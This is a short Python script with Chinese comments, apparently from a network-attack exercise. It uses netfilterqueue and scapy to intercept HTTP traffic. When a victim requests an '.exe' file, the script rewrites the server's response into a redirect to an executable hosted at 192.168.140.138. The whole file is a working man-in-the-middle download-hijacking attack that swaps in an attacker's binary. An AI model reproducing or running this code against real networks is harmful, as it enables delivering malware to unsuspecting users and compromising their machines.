import netfilterqueue
from scapy.all import *

ack_list = []  #存储TCP头中ACK号，由于Response报文中的Seq号等于其Request报文中的ACK号，通过这点特征将二者关联在一起


def packet_handler(pkt):
    #将Netfilterqueue的报文转换为Scapy的报文，以便进行查看，修改
    scapy_packet = IP(pkt.get_payload())
    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
        if scapy_packet[TCP].dport == 80:
            if '.exe' in scapy_packet[Raw].load.decode(
                    'utf-8'):  #如果发现请求报文中含有.exe，表明目标正在下载可执行文件，因此准备进行替换操作
                print("To replace exe file now")
                ack_list.append(scapy_packet[TCP].ack)

        elif scapy_packet[TCP].sport == 80:
            if scapy_packet[TCP].seq in ack_list:
                ack_list.remove(scapy_packet[TCP].seq)
                load_change = "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.140.138/sogou.exe\n\n"
                scapy_packet[Raw].load = load_change.encode('utf-8')
                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[TCP].chksum
                pkt.set_payload(bytes(scapy_packet))

    pkt.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, packet_handler)
queue.run()